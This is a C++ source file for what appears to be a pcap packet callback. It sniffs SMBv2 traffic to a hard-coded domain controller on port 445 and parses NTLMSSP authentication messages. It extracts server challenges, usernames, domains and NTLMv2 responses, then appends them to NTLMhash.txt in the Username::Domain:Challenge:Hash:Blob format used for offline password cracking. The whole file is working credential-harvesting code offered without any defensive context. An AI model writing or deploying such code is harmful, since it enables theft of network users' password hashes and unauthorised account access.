#include "stdafx.h"
#include <bitset>
#include <string>
using namespace std;

void FillStockTokenTarg(negTokenTargComponent *ntt1, negTokenTargComponent *ntt2)
{	/*48 130 1 13 160 3 10 1 for Server Challenge*/
	ntt1->negTokenTargcomponent[0] = 48;
	ntt1->negTokenTargcomponent[1] = 130;
	ntt1->negTokenTargcomponent[2] = 1;
	ntt1->negTokenTargcomponent[3] = 13;
	ntt1->negTokenTargcomponent[4] = 160;
	ntt1->negTokenTargcomponent[5] = 3;
	ntt1->negTokenTargcomponent[6] = 10;
	ntt1->negTokenTargcomponent[7] = 1;

	/*48 130 1 13 160 3 10 1 for Client Challenge*/
	ntt2->negTokenTargcomponent[0] = 48;
	ntt2->negTokenTargcomponent[1] = 130;
	ntt2->negTokenTargcomponent[2] = 2;
	ntt2->negTokenTargcomponent[3] = 65;
	ntt2->negTokenTargcomponent[4] = 160;
	ntt2->negTokenTargcomponent[5] = 3;
	ntt2->negTokenTargcomponent[6] = 10;
	ntt2->negTokenTargcomponent[7] = 1;
}

int GetDecade(u_short tcpPort)
{
	int result = (tcpPort == 0) ? 1 : 0;
	while (tcpPort != 0)
	{
		++result;
		tcpPort /= 10;
	}

	return result;
}

void GetChallenge(smbv2* smb, u_short tcpPort)
{
	setupRequest *sr;
	securityBlob *sb;
	const char* fileName = "NTLMhash.txt";

	sr = (setupRequest*)((u_char*)smb + smb->headLen);

	int staticLength = sr->length >> 1;
	bool dynamicPart = sr->length & 1;

	if (dynamicPart)
	{
		sb = (securityBlob*)((u_char*)sr + staticLength);

		int sb_len = 4;
		int sb_len_with_reserved = 12;
		u_short clietnAuthLen = 585;
		u_short clientAuthOffset = 88;

		u_int *simpleProtectionNegotiation = (u_int*)((u_char*)sb + sb_len);
		if(*simpleProtectionNegotiation == 0)
			simpleProtectionNegotiation = (u_int*)((u_char*)sb + sb_len_with_reserved);
		
		u_int ntlmSPNServer = 285311649;
		u_int ntlmSPNClient = 1157792417;

		if (*simpleProtectionNegotiation == ntlmSPNServer  || *simpleProtectionNegotiation == ntlmSPNClient)
		{
			int spn_len = 4;
			negTokenTargComponent *stockNegTokenTargServer = new negTokenTargComponent;
			negTokenTargComponent *stockNegTokenTargClient = new negTokenTargComponent;
			FillStockTokenTarg(stockNegTokenTargServer, stockNegTokenTargClient);
			//17 //29
			negTokenTarg *nTT = (negTokenTarg*)((u_char*)simpleProtectionNegotiation + spn_len);

			int portLen = GetDecade(tcpPort);
			char* portStr = new char[portLen + 1];
			portStr[portLen] = '\0';
			sprintf(portStr, "%d", tcpPort);
			
			if (nTT->ntt == *stockNegTokenTargServer)
			{
				NTLMSSPfromServer *ntlmssp = (NTLMSSPfromServer*)((u_char*)nTT + sizeof(negTokenTarg));

				FILE *ptrFile;
				ptrFile = fopen(fileName, "a");
				if (ptrFile != NULL)
				{
					int challengeLen = 17;
					char *str = new char[challengeLen];
				
					str[16] = '\0';
					sprintf(str, "%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x", ntlmssp->challenge.byte[0], ntlmssp->challenge.byte[1], ntlmssp->challenge.byte[2], ntlmssp->challenge.byte[3], ntlmssp->challenge.byte[4], ntlmssp->challenge.byte[5], ntlmssp->challenge.byte[6], ntlmssp->challenge.byte[7]);
					fputs("\n NTLM Server Challenge: ", ptrFile); // записать строку в файл
					for (int i = 0; i < 16; ++i)
						fputc(str[i], ptrFile);
					fputs("  with tcp port: ", ptrFile);
					for (int i = 0; i < portLen; ++i)
						fputc(portStr[i], ptrFile);
					//fputs(, ptrFile);
					//fputs("\n port: %d \n", ptrFile);
					fclose(ptrFile);

					delete[] str;
				}
				else throw exception("Couldn`t open file");
			}
//Username::Domain:Challenge:NTLMv2hash(aka HMAC-MD5):blob(entire NTLMv2 response except the HMAC that was in the preceding field)
			else if (nTT->ntt == *stockNegTokenTargClient)
			{
				int sizeofClientNegTokenTarg = 17;
				NTLMSSPfromClient *ntlmssp = new NTLMSSPfromClient;
				ntlmssp = (NTLMSSPfromClient*)((u_char*)nTT + sizeofClientNegTokenTarg);

				FILE *ptrFile;
				ptrFile = fopen(fileName, "a");
				if (ptrFile != NULL)
				{
					u_char *pointer = (u_char*)((u_char*)ntlmssp + sizeof(NTLMSSPfromClient));

					char *challengeStr = new char[17];
					char *domainStr = new char[(ntlmssp->dN.len) / 2 + 1];
					char *userNameStr = new char[(ntlmssp->uN.len) / 2 + 1];
					char *ntproofStr = new char[17 * 2 - 1];
					char *blobStr = new char[ntlmssp->ntlm.len * 2 + 1];

					for (int i = 0; i < (ntlmssp->dN.len) / 2; ++i)
						domainStr[i] = pointer[i * 2];
					domainStr[(ntlmssp->dN.len) / 2] = '\0';
					
					pointer = pointer + (ntlmssp->dN.len);
					
					for (int i = 0; i < (ntlmssp->uN.len) / 2; ++i)
						userNameStr[i] = pointer[i * 2];
					userNameStr[(ntlmssp->uN.len)/2] = '\0';

					pointer = pointer + ntlmssp->uN.len + ntlmssp->hN.len + ntlmssp->lm.len;
					sprintf(ntproofStr, "%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x", pointer[0], pointer[1], pointer[2], pointer[3], pointer[4], pointer[5], pointer[6], pointer[7], pointer[8], pointer[9], pointer[10], pointer[11], pointer[12], pointer[13], pointer[14], pointer[15]);
					ntproofStr[16 * 2] = '\0';
					
					u_char* challengePointer = pointer + 32; // Поля от ntProofStr до ClientChallenge

					sprintf(challengeStr, "%.2x%.2x%.2x%.2x%.2x%.2x%.2x%.2x", challengePointer[0], challengePointer[1], challengePointer[2], challengePointer[3], challengePointer[4], challengePointer[5], challengePointer[6], challengePointer[7]);
					challengeStr[16] = '\0';

					pointer = pointer + 16; // ntproofStr
					
					for (int i = 0; i < ntlmssp->ntlm.len; ++i)
						sprintf(blobStr + 2 * i, "%.2x", pointer[i]);
					
					blobStr[ntlmssp->ntlm.len * 2] = '\0';
					
					fputs("\n", ptrFile); // записать строку в файл
					for (int i = 0; i < ntlmssp->uN.len / 2; ++i)
						fputc(userNameStr[i], ptrFile);
					fputs("::", ptrFile);

					for (int i = 0; i < (ntlmssp->dN.len) / 2; ++i)
						fputc(domainStr[i], ptrFile);
					fputs(":", ptrFile);

					for (int i = 0; i < 16; ++i)
						fputc(challengeStr[i], ptrFile);
					fputs(":", ptrFile);
					
					for (int i = 0; i < 32; ++i)
						fputc(ntproofStr[i], ptrFile);
					fputs(":", ptrFile);
					
					for (int i = 0; i < ntlmssp->ntlm.len * 2 - 32; ++i)
						fputc(blobStr[i], ptrFile);

					fclose(ptrFile);

					delete[] challengeStr;
					delete[] domainStr;
					delete[] userNameStr ;
					delete[] ntproofStr ;
					//
					delete[] blobStr;
				}
				else throw exception("Couldn`t open file");
			}
			else throw exception("This wrong negTokenTarg");
		}
		else throw exception("This is not NTLM protection Negotiation");
	}
	else throw exception("There is no dynamic part");
}

bool PacketContinuation(int ipLength, int tcpLength, int headerLength)
{
	int ethLength = 14;
	if (headerLength > (ethLength + ipLength + tcpLength))
		return true;
	return false;
}

void FillPar(u_char* par)
{
	par[0] = 192;
	par[1] = 168;
	par[2] = 4;
	par[3] = 1;
	par[4] = 445 >> 8;
	par[5] = 445 ;

	//u_short port = par[4] << 8 | par[5];
}

void FillStruct(parStruct &structure, u_char* par)
{
	structure.domainController.byte1 = par[0];
	structure.domainController.byte2 = par[1];
	structure.domainController.byte3 = par[2];
	structure.domainController.byte4 = par[3];

	structure.domainPort = par[4] <<8 | par[5];
}

int CountSmbLen(netBios_header nbt)
{
	int result = 0;

	result = nbt.length[0] << 16 | nbt.length[1] << 8 | nbt.length[2];

	return result;
}

void PacketWork(u_char* param,const struct pcap_pkthdr *header, const u_char *pkt_data)
{
	/* Здесь хранятся данные о контролере домена (IP, Port)*/
	parStruct parametr;
	FillStruct(parametr, param);

	ip_header *ih;
	udp_header *uh;
	tcp_header *tcp;
	u_int ip_len;
	netBios_header *nbt;
	smbv2 *smb;

	u_int smbv2Component = 1112364030;
	int eth_pack_len = 14;

	ofstream fout;
	const char* fileName = "NTLMhash.txt";
	

	// retireve the position of the ip header
	ih = (ip_header *)(pkt_data +
		14); //length of ethernet header

			 // retireve the position of the udp header //
	ip_len = (ih->ver_ihl & 0xf) * 4;

	if (ih->proto == 6) // 
	{
		tcp = (tcp_header *)((u_char*)ih + ip_len);
		int tcp_length = tcp->header_length * 4;

		//check if netBios SS is in the packet

		int full_pack_len = header->len;

		//(PacketContinuation(ip_len, tcp_length, header->len)) && (ntohs((u_short)tcp->sport) == 139 || ntohs((u_short)tcp->dport) == 139)
		if ((full_pack_len > eth_pack_len + ip_len + tcp_length) && (htons(tcp->dport) == parametr.domainPort || htons(tcp->sport) == parametr.domainPort))
		{
			//48385 htons == 445
			nbt = (netBios_header*)((u_char*)tcp + tcp_length);

			int nbt_len = 4;
			int smb_full_len = CountSmbLen(*nbt);

			if (smb_full_len == 0)
			{
				throw exception("No smb continuation");
			}

			int usual_smb_h_len = 64;
			smb = (smbv2*)((u_char*)nbt + nbt_len);

			if (smb->headLen != usual_smb_h_len)
			{
				throw exception("Wrong smb header size");
			}
			// 1112364030 - smbv2 component

			if (smb->servComponent == smbv2Component)
			{
				if (smb->command == 1 && (ih->spa == parametr.domainController || ih->tpa == parametr.domainController))
				{
					if (htons(tcp->dport) == parametr.domainPort)
						GetChallenge(smb, htons(tcp->sport));
					else
						GetChallenge(smb, htons(tcp->dport));
				}

				else throw exception("Packets don`t belong to NTLM");
			}
			else throw exception("This is not smbv2 header");
		}
	}
}